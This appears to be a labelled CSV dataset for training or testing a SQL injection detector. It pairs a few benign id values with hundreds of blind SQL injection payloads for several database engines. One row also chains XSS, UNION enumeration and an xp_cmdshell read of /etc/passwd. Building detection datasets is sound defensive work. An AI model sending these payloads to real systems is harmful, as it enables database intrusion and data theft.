Sentence,Label
id=1,0
id=2,0
id=admin,0
id=test,0
id=123,0
"9259 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(""XSS"")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#",1
"1""'.,((.)))",1
"1'kXnwZt<'"">zeLkCe",1
1) AND 1901=4617 AND (1630=1630,1
1) AND 1972=1972 AND (3844=3844,1
1) AND 4071=9034 AND (8234=8234,1
1)) AND 5062=2146 AND ((1138=1138,1
1)) AND 1972=1972 AND ((2471=2471,1
1)) AND 7985=3189 AND ((4096=4096,1
1 AND 7006=5454,1
1 AND 1972=1972,1
1 AND 5069=4622,1
1 AND 8881=6900-- mUGO,1
1 AND 1972=1972-- BrPM,1
1 AND 3922=1956-- LKdT,1
1') AND 2127=3187 AND ('pUWp'='pUWp,1
1') AND 1972=1972 AND ('zUCZ'='zUCZ,1
1') AND 3113=7790 AND ('QwfQ'='QwfQ,1
1')) AND 3072=5943 AND (('fECU'='fECU,1
1')) AND 1972=1972 AND (('DQKL'='DQKL,1
1')) AND 4021=6740 AND (('BBdl'='BBdl,1
1' AND 6209=6749 AND 'pxfE'='pxfE,1
1' AND 1972=1972 AND 'iQcZ'='iQcZ,1
1' AND 9860=3510 AND 'RUhd'='RUhd,1
1') AND 6550=9077 AND ('hdwH' LIKE 'hdwH,1
1') AND 1972=1972 AND ('Sngh' LIKE 'Sngh,1
1') AND 5398=4450 AND ('baZv' LIKE 'baZv,1
1%' AND 5339=4727 AND 'PGjT%'='PGjT,1
1%' AND 1972=1972 AND 'uTTq%'='uTTq,1
1%' AND 6238=9915 AND 'dxIY%'='dxIY,1
1' AND 6555=1580 AND 'rWTF' LIKE 'rWTF,1
1' AND 1972=1972 AND 'mvHo' LIKE 'mvHo,1
1' AND 6394=9857 AND 'VZLb' LIKE 'VZLb,1
"1"") AND 8504=9888 AND (""xFtd""=""xFtd",1
"1"") AND 1972=1972 AND (""smZj""=""smZj",1
"1"") AND 6331=8473 AND (""HkNA""=""HkNA",1
"1"" AND 3029=9935 AND ""TzkH""=""TzkH",1
"1"" AND 1972=1972 AND ""LcnN""=""LcnN",1
"1"" AND 7056=3151 AND ""VuKJ""=""VuKJ",1
1) AND 5948=(SELECT (CASE WHEN (5948=6199) THEN 5948 ELSE (SELECT 6199 UNION SELECT 8242) END))-- NsPC,1
1) AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- ayvP,1
1) AND 3357=(SELECT (CASE WHEN (3357=4511) THEN 3357 ELSE (SELECT 4511 UNION SELECT 2572) END))-- IZsx,1
1)) AND 2637=(SELECT (CASE WHEN (2637=6570) THEN 2637 ELSE (SELECT 6570 UNION SELECT 7778) END))-- ebuc,1
1)) AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- KPyQ,1
1)) AND 7432=(SELECT (CASE WHEN (7432=2791) THEN 7432 ELSE (SELECT 2791 UNION SELECT 5412) END))-- dqex,1
1 AND 3742=(SELECT (CASE WHEN (3742=3274) THEN 3742 ELSE (SELECT 3274 UNION SELECT 2214) END))-- qLBG,1
1 AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- xReu,1
1 AND 3527=(SELECT (CASE WHEN (3527=9209) THEN 3527 ELSE (SELECT 9209 UNION SELECT 3761) END))-- bXmT,1
1') AND 8707=(SELECT (CASE WHEN (8707=4605) THEN 8707 ELSE (SELECT 4605 UNION SELECT 7096) END))-- WkcW,1
1') AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- iDjo,1
1') AND 2989=(SELECT (CASE WHEN (2989=8988) THEN 2989 ELSE (SELECT 8988 UNION SELECT 2523) END))-- sUNJ,1
1')) AND 2436=(SELECT (CASE WHEN (2436=7289) THEN 2436 ELSE (SELECT 7289 UNION SELECT 1247) END))-- KZne,1
1')) AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- yarS,1
1')) AND 6898=(SELECT (CASE WHEN (6898=6102) THEN 6898 ELSE (SELECT 6102 UNION SELECT 8090) END))-- OweU,1
1' AND 7162=(SELECT (CASE WHEN (7162=3070) THEN 7162 ELSE (SELECT 3070 UNION SELECT 2733) END))-- Znda,1
1' AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- LiUh,1
1' AND 9119=(SELECT (CASE WHEN (9119=3370) THEN 9119 ELSE (SELECT 3370 UNION SELECT 8709) END))-- jLUb,1
1%' AND 8913=(SELECT (CASE WHEN (8913=5310) THEN 8913 ELSE (SELECT 5310 UNION SELECT 7449) END))-- zWYE,1
1%' AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- HsfO,1
1%' AND 5052=(SELECT (CASE WHEN (5052=5964) THEN 5052 ELSE (SELECT 5964 UNION SELECT 2181) END))-- ONVF,1
"1"") AND 7355=(SELECT (CASE WHEN (7355=2530) THEN 7355 ELSE (SELECT 2530 UNION SELECT 9876) END))-- BSDB",1
"1"") AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- YHtv",1
"1"") AND 3863=(SELECT (CASE WHEN (3863=1249) THEN 3863 ELSE (SELECT 1249 UNION SELECT 8717) END))-- mtQE",1
"1"" AND 8948=(SELECT (CASE WHEN (8948=9707) THEN 8948 ELSE (SELECT 9707 UNION SELECT 6292) END))-- oanX",1
"1"" AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- VMNF",1
"1"" AND 6895=(SELECT (CASE WHEN (6895=3348) THEN 6895 ELSE (SELECT 3348 UNION SELECT 1964) END))-- wALm",1
1) AND 5985=2385-- LfXg,1
1) AND 1961=1961-- NXir,1
1) AND 8764=2892-- NYnI,1
1)) AND 3558=6141-- gbet,1
1)) AND 1961=1961-- NUrM,1
1)) AND 7066=1005-- eAPl,1
1') AND 3457=5611-- xJtJ,1
1') AND 1961=1961-- DViO,1
1') AND 6067=3707-- BZjT,1
1')) AND 5084=5477-- dWxo,1
1')) AND 1961=1961-- HMjX,1
1')) AND 2735=3389-- CkTs,1
1' AND 5543=8380-- mYVk,1
1' AND 1961=1961-- ECkw,1
1' AND 4290=3234-- LUIp,1
1%' AND 5946=5416-- OgIJ,1
1%' AND 1961=1961-- mexB,1
1%' AND 9671=5687-- OPYh,1
"1"") AND 9099=7887-- Nifs",1
"1"") AND 1961=1961-- Rfqc",1
"1"") AND 4144=9347-- lIzy",1
"1"" AND 5772=1521-- wgPy",1
"1"" AND 1961=1961-- tChA",1
"1"" AND 6525=1127-- aGCD",1
1) RLIKE (SELECT (CASE WHEN (9685=1563) THEN 1 ELSE 0x28 END)) AND (8606=8606,1
1) RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND (5967=5967,1
1) RLIKE (SELECT (CASE WHEN (5630=9961) THEN 1 ELSE 0x28 END)) AND (6121=6121,1
1)) RLIKE (SELECT (CASE WHEN (4952=1135) THEN 1 ELSE 0x28 END)) AND ((9979=9979,1
1)) RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND ((1714=1714,1
1)) RLIKE (SELECT (CASE WHEN (9452=2075) THEN 1 ELSE 0x28 END)) AND ((6365=6365,1
1 RLIKE (SELECT (CASE WHEN (9888=2231) THEN 1 ELSE 0x28 END)),1
1 RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)),1
1 RLIKE (SELECT (CASE WHEN (2449=1070) THEN 1 ELSE 0x28 END)),1
1 RLIKE (SELECT (CASE WHEN (2223=3560) THEN 1 ELSE 0x28 END))-- TtAU,1
1 RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END))-- ifVU,1
1 RLIKE (SELECT (CASE WHEN (3187=6414) THEN 1 ELSE 0x28 END))-- krAQ,1
1') RLIKE (SELECT (CASE WHEN (4118=5789) THEN 1 ELSE 0x28 END)) AND ('aaMm'='aaMm,1
1') RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND ('YBWk'='YBWk,1
1') RLIKE (SELECT (CASE WHEN (3437=1411) THEN 1 ELSE 0x28 END)) AND ('psku'='psku,1
1')) RLIKE (SELECT (CASE WHEN (5094=2967) THEN 1 ELSE 0x28 END)) AND (('liLF'='liLF,1
1')) RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND (('zPUa'='zPUa,1
1')) RLIKE (SELECT (CASE WHEN (4032=1747) THEN 1 ELSE 0x28 END)) AND (('nwZP'='nwZP,1
1' RLIKE (SELECT (CASE WHEN (1557=4709) THEN 1 ELSE 0x28 END)) AND 'wWHo'='wWHo,1
1' RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND 'HQtL'='HQtL,1
1' RLIKE (SELECT (CASE WHEN (9465=1695) THEN 1 ELSE 0x28 END)) AND 'ZMHj'='ZMHj,1
1') RLIKE (SELECT (CASE WHEN (4647=9410) THEN 1 ELSE 0x28 END)) AND ('KGLM' LIKE 'KGLM,1
1') RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND ('vGDI' LIKE 'vGDI,1
1') RLIKE (SELECT (CASE WHEN (7085=6819) THEN 1 ELSE 0x28 END)) AND ('qYFa' LIKE 'qYFa,1
1%' RLIKE (SELECT (CASE WHEN (1671=7580) THEN 1 ELSE 0x28 END)) AND 'cQnt%'='cQnt,1
1%' RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND 'Eocq%'='Eocq,1
1%' RLIKE (SELECT (CASE WHEN (7658=6622) THEN 1 ELSE 0x28 END)) AND 'jYUC%'='jYUC,1
1' RLIKE (SELECT (CASE WHEN (8198=2644) THEN 1 ELSE 0x28 END)) AND 'lqYb' LIKE 'lqYb,1
1' RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND 'aChz' LIKE 'aChz,1
1' RLIKE (SELECT (CASE WHEN (7052=8413) THEN 1 ELSE 0x28 END)) AND 'dnro' LIKE 'dnro,1
"1"") RLIKE (SELECT (CASE WHEN (1531=3572) THEN 1 ELSE 0x28 END)) AND (""vfJp""=""vfJp",1
"1"") RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND (""LQnv""=""LQnv",1
"1"") RLIKE (SELECT (CASE WHEN (1383=5474) THEN 1 ELSE 0x28 END)) AND (""SGsN""=""SGsN",1
"1"" RLIKE (SELECT (CASE WHEN (4237=8249) THEN 1 ELSE 0x28 END)) AND ""cxJH""=""cxJH",1
"1"" RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND ""drqW""=""drqW",1
"1"" RLIKE (SELECT (CASE WHEN (6818=5374) THEN 1 ELSE 0x28 END)) AND ""KlDe""=""KlDe",1
1) AND (SELECT (CASE WHEN (3178=3083) THEN NULL ELSE CAST((CHR(106)||CHR(104)||CHR(104)||CHR(97)) AS NUMERIC) END)) IS NULL AND (3627=3627,1
1) AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND (9762=9762,1
1) AND (SELECT (CASE WHEN (3327=5419) THEN NULL ELSE CAST((CHR(71)||CHR(73)||CHR(67)||CHR(121)) AS NUMERIC) END)) IS NULL AND (3748=3748,1
1)) AND (SELECT (CASE WHEN (2756=1066) THEN NULL ELSE CAST((CHR(78)||CHR(68)||CHR(77)||CHR(106)) AS NUMERIC) END)) IS NULL AND ((9881=9881,1
1)) AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND ((4738=4738,1
1)) AND (SELECT (CASE WHEN (5792=4573) THEN NULL ELSE CAST((CHR(114)||CHR(99)||CHR(81)||CHR(106)) AS NUMERIC) END)) IS NULL AND ((9090=9090,1
1 AND (SELECT (CASE WHEN (2257=6939) THEN NULL ELSE CAST((CHR(102)||CHR(108)||CHR(76)||CHR(88)) AS NUMERIC) END)) IS NULL,1
1 AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL,1
1 AND (SELECT (CASE WHEN (6847=7566) THEN NULL ELSE CAST((CHR(118)||CHR(116)||CHR(121)||CHR(108)) AS NUMERIC) END)) IS NULL,1
1 AND (SELECT (CASE WHEN (2446=2114) THEN NULL ELSE CAST((CHR(103)||CHR(103)||CHR(99)||CHR(100)) AS NUMERIC) END)) IS NULL-- iDYI,1
1 AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL-- GozS,1
1 AND (SELECT (CASE WHEN (4987=6500) THEN NULL ELSE CAST((CHR(104)||CHR(66)||CHR(102)||CHR(74)) AS NUMERIC) END)) IS NULL-- GqID,1
1') AND (SELECT (CASE WHEN (9093=4361) THEN NULL ELSE CAST((CHR(88)||CHR(107)||CHR(119)||CHR(115)) AS NUMERIC) END)) IS NULL AND ('oONS'='oONS,1
1') AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND ('Fydz'='Fydz,1
1') AND (SELECT (CASE WHEN (9297=2953) THEN NULL ELSE CAST((CHR(115)||CHR(108)||CHR(103)||CHR(113)) AS NUMERIC) END)) IS NULL AND ('jqRj'='jqRj,1
1')) AND (SELECT (CASE WHEN (1523=6338) THEN NULL ELSE CAST((CHR(109)||CHR(84)||CHR(87)||CHR(82)) AS NUMERIC) END)) IS NULL AND (('joDh'='joDh,1
1')) AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND (('XQzb'='XQzb,1
1')) AND (SELECT (CASE WHEN (6044=3181) THEN NULL ELSE CAST((CHR(86)||CHR(106)||CHR(119)||CHR(114)) AS NUMERIC) END)) IS NULL AND (('VsHI'='VsHI,1
1' AND (SELECT (CASE WHEN (5180=1517) THEN NULL ELSE CAST((CHR(80)||CHR(78)||CHR(90)||CHR(66)) AS NUMERIC) END)) IS NULL AND 'AQBp'='AQBp,1
1' AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND 'nUIE'='nUIE,1
1' AND (SELECT (CASE WHEN (1895=5376) THEN NULL ELSE CAST((CHR(81)||CHR(71)||CHR(84)||CHR(85)) AS NUMERIC) END)) IS NULL AND 'XUAi'='XUAi,1
1') AND (SELECT (CASE WHEN (2410=6211) THEN NULL ELSE CAST((CHR(115)||CHR(75)||CHR(81)||CHR(77)) AS NUMERIC) END)) IS NULL AND ('YjNf' LIKE 'YjNf,1
1') AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND ('mdEm' LIKE 'mdEm,1
1') AND (SELECT (CASE WHEN (3207=4649) THEN NULL ELSE CAST((CHR(90)||CHR(121)||CHR(77)||CHR(89)) AS NUMERIC) END)) IS NULL AND ('Wbwx' LIKE 'Wbwx,1
1%' AND (SELECT (CASE WHEN (6167=7090) THEN NULL ELSE CAST((CHR(88)||CHR(81)||CHR(71)||CHR(77)) AS NUMERIC) END)) IS NULL AND 'VkDR%'='VkDR,1
1%' AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND 'AqKy%'='AqKy,1
1%' AND (SELECT (CASE WHEN (7333=8573) THEN NULL ELSE CAST((CHR(83)||CHR(121)||CHR(81)||CHR(98)) AS NUMERIC) END)) IS NULL AND 'JnuZ%'='JnuZ,1
1' AND (SELECT (CASE WHEN (8727=7238) THEN NULL ELSE CAST((CHR(109)||CHR(72)||CHR(70)||CHR(115)) AS NUMERIC) END)) IS NULL AND 'lnLw' LIKE 'lnLw,1
1' AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND 'BhBj' LIKE 'BhBj,1
1' AND (SELECT (CASE WHEN (3237=2233) THEN NULL ELSE CAST((CHR(78)||CHR(114)||CHR(117)||CHR(121)) AS NUMERIC) END)) IS NULL AND 'XQEO' LIKE 'XQEO,1
"1"") AND (SELECT (CASE WHEN (1493=9775) THEN NULL ELSE CAST((CHR(98)||CHR(74)||CHR(120)||CHR(89)) AS NUMERIC) END)) IS NULL AND (""ycWv""=""ycWv",1
"1"") AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND (""GHpW""=""GHpW",1
"1"") AND (SELECT (CASE WHEN (1006=5665) THEN NULL ELSE CAST((CHR(110)||CHR(104)||CHR(81)||CHR(106)) AS NUMERIC) END)) IS NULL AND (""SOvg""=""SOvg",1
"1"" AND (SELECT (CASE WHEN (1871=4448) THEN NULL ELSE CAST((CHR(101)||CHR(89)||CHR(102)||CHR(88)) AS NUMERIC) END)) IS NULL AND ""aZij""=""aZij",1
"1"" AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND ""kAzv""=""kAzv",1
"1"" AND (SELECT (CASE WHEN (3178=3561) THEN NULL ELSE CAST((CHR(68)||CHR(87)||CHR(112)||CHR(72)) AS NUMERIC) END)) IS NULL AND ""LEQV""=""LEQV",1
"1) AND (SELECT (CASE WHEN (1439=1955) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1439) END) FROM DUAL) IS NULL AND (5450=5450",1
"1) AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND (5030=5030",1
"1) AND (SELECT (CASE WHEN (7838=3165) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7838) END) FROM DUAL) IS NULL AND (2149=2149",1
"1)) AND (SELECT (CASE WHEN (2226=7999) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2226) END) FROM DUAL) IS NULL AND ((8508=8508",1
"1)) AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND ((4820=4820",1
"1)) AND (SELECT (CASE WHEN (7429=1114) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7429) END) FROM DUAL) IS NULL AND ((9628=9628",1
"1 AND (SELECT (CASE WHEN (2805=1358) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2805) END) FROM DUAL) IS NULL",1
"1 AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL",1
"1 AND (SELECT (CASE WHEN (3065=5857) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3065) END) FROM DUAL) IS NULL",1
"1 AND (SELECT (CASE WHEN (4528=4828) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4528) END) FROM DUAL) IS NULL-- UAoU",1
"1 AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL-- pESV",1
"1 AND (SELECT (CASE WHEN (4754=4216) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4754) END) FROM DUAL) IS NULL-- knlf",1
"1') AND (SELECT (CASE WHEN (1968=6782) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1968) END) FROM DUAL) IS NULL AND ('dOGP'='dOGP",1
"1') AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND ('gbkA'='gbkA",1
"1') AND (SELECT (CASE WHEN (5700=2181) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5700) END) FROM DUAL) IS NULL AND ('aIUq'='aIUq",1
"1')) AND (SELECT (CASE WHEN (1715=2480) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1715) END) FROM DUAL) IS NULL AND (('HYCD'='HYCD",1
"1')) AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND (('JfLx'='JfLx",1
"1')) AND (SELECT (CASE WHEN (4866=5827) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4866) END) FROM DUAL) IS NULL AND (('AFix'='AFix",1
"1' AND (SELECT (CASE WHEN (7903=6536) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7903) END) FROM DUAL) IS NULL AND 'rJah'='rJah",1
"1' AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND 'FyZO'='FyZO",1
"1' AND (SELECT (CASE WHEN (8262=9837) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8262) END) FROM DUAL) IS NULL AND 'qZhi'='qZhi",1
"1') AND (SELECT (CASE WHEN (6839=4667) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6839) END) FROM DUAL) IS NULL AND ('aqhf' LIKE 'aqhf",1
"1') AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND ('RCej' LIKE 'RCej",1
"1') AND (SELECT (CASE WHEN (4752=9385) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4752) END) FROM DUAL) IS NULL AND ('deUf' LIKE 'deUf",1
"1%' AND (SELECT (CASE WHEN (1617=1745) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1617) END) FROM DUAL) IS NULL AND 'zlNw%'='zlNw",1
"1%' AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND 'qPsC%'='qPsC",1
"1%' AND (SELECT (CASE WHEN (6055=9145) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6055) END) FROM DUAL) IS NULL AND 'KQKH%'='KQKH",1
"1' AND (SELECT (CASE WHEN (8549=9000) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8549) END) FROM DUAL) IS NULL AND 'bQQR' LIKE 'bQQR",1
"1' AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND 'DPps' LIKE 'DPps",1
"1' AND (SELECT (CASE WHEN (3676=7742) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3676) END) FROM DUAL) IS NULL AND 'TXHo' LIKE 'TXHo",1
"1"") AND (SELECT (CASE WHEN (7944=2556) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7944) END) FROM DUAL) IS NULL AND (""WUTR""=""WUTR",1
"1"") AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND (""OrfH""=""OrfH",1
"1"") AND (SELECT (CASE WHEN (6429=5858) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6429) END) FROM DUAL) IS NULL AND (""cpOJ""=""cpOJ",1
"1"" AND (SELECT (CASE WHEN (5970=5078) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5970) END) FROM DUAL) IS NULL AND ""eyTB""=""eyTB",1
"1"" AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND ""NqKs""=""NqKs",1
"1"" AND (SELECT (CASE WHEN (5108=6524) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5108) END) FROM DUAL) IS NULL AND ""fNrj""=""fNrj",1
"1) AND CASE WHEN 6792=2327 THEN 6792 ELSE JSON(CHAR(119,67,103,97)) END AND (8643=8643",1
"1) AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND (3441=3441",1
"1) AND CASE WHEN 3993=9645 THEN 3993 ELSE JSON(CHAR(66,71,73,67)) END AND (3378=3378",1
"1)) AND CASE WHEN 1210=8996 THEN 1210 ELSE JSON(CHAR(100,101,105,80)) END AND ((6973=6973",1
"1)) AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND ((2627=2627",1
"1)) AND CASE WHEN 2206=1776 THEN 2206 ELSE JSON(CHAR(112,120,70,80)) END AND ((2168=2168",1
"1 AND CASE WHEN 9349=2205 THEN 9349 ELSE JSON(CHAR(67,100,90,119)) END",1
"1 AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END",1
"1 AND CASE WHEN 3023=8622 THEN 3023 ELSE JSON(CHAR(117,121,110,87)) END",1
"1 AND CASE WHEN 9258=6175 THEN 9258 ELSE JSON(CHAR(109,118,110,66)) END-- vGJf",1
"1 AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END-- BHKr",1
"1 AND CASE WHEN 2301=2472 THEN 2301 ELSE JSON(CHAR(70,82,83,82)) END-- CYzx",1
"1') AND CASE WHEN 4875=1123 THEN 4875 ELSE JSON(CHAR(74,103,101,112)) END AND ('NCZl'='NCZl",1
"1') AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND ('TTwg'='TTwg",1
"1') AND CASE WHEN 5640=9592 THEN 5640 ELSE JSON(CHAR(116,74,65,98)) END AND ('vJmG'='vJmG",1
"1')) AND CASE WHEN 1690=2944 THEN 1690 ELSE JSON(CHAR(88,122,90,72)) END AND (('zrIr'='zrIr",1
"1')) AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND (('pxPc'='pxPc",1
"1')) AND CASE WHEN 5546=1754 THEN 5546 ELSE JSON(CHAR(109,111,73,77)) END AND (('hawn'='hawn",1
"1' AND CASE WHEN 4981=5612 THEN 4981 ELSE JSON(CHAR(83,68,82,83)) END AND 'mTcL'='mTcL",1
"1' AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND 'Gttf'='Gttf",1
"1' AND CASE WHEN 1105=3634 THEN 1105 ELSE JSON(CHAR(100,77,83,102)) END AND 'dUHs'='dUHs",1
"1') AND CASE WHEN 6464=6297 THEN 6464 ELSE JSON(CHAR(102,121,80,104)) END AND ('OyTc' LIKE 'OyTc",1
"1') AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND ('yUcZ' LIKE 'yUcZ",1
"1') AND CASE WHEN 9677=4801 THEN 9677 ELSE JSON(CHAR(122,100,108,104)) END AND ('oavW' LIKE 'oavW",1
"1%' AND CASE WHEN 2760=9939 THEN 2760 ELSE JSON(CHAR(101,70,122,119)) END AND 'muHw%'='muHw",1
"1%' AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND 'RmMJ%'='RmMJ",1
"1%' AND CASE WHEN 9089=3886 THEN 9089 ELSE JSON(CHAR(71,90,76,85)) END AND 'boEt%'='boEt",1
"1' AND CASE WHEN 6193=7877 THEN 6193 ELSE JSON(CHAR(87,107,115,113)) END AND 'LkgG' LIKE 'LkgG",1
"1' AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND 'vXgS' LIKE 'vXgS",1
"1' AND CASE WHEN 2634=4405 THEN 2634 ELSE JSON(CHAR(99,104,74,72)) END AND 'FMsI' LIKE 'FMsI",1
"1"") AND CASE WHEN 4905=3116 THEN 4905 ELSE JSON(CHAR(87,69,121,87)) END AND (""FlAJ""=""FlAJ",1
"1"") AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND (""JOvH""=""JOvH",1
"1"") AND CASE WHEN 2105=2129 THEN 2105 ELSE JSON(CHAR(107,121,115,81)) END AND (""nrQQ""=""nrQQ",1
"1"" AND CASE WHEN 9517=2539 THEN 9517 ELSE JSON(CHAR(78,121,112,101)) END AND ""GruX""=""GruX",1
"1"" AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND ""Fvrq""=""Fvrq",1
"1"" AND CASE WHEN 7081=1716 THEN 7081 ELSE JSON(CHAR(120,112,115,101)) END AND ""tkHX""=""tkHX",1
(SELECT (CASE WHEN (5826=3849) THEN 1 ELSE (SELECT 3849 UNION SELECT 6264) END)),1
(SELECT (CASE WHEN (2694=2694) THEN 1 ELSE (SELECT 1650 UNION SELECT 1654) END)),1
(SELECT (CASE WHEN (1671=6246) THEN 1 ELSE (SELECT 6246 UNION SELECT 3462) END)),1
(CASE WHEN (5477=9419) THEN 5477 ELSE 5477*(SELECT 5477 FROM DUAL UNION SELECT 9419 FROM DUAL) END),1
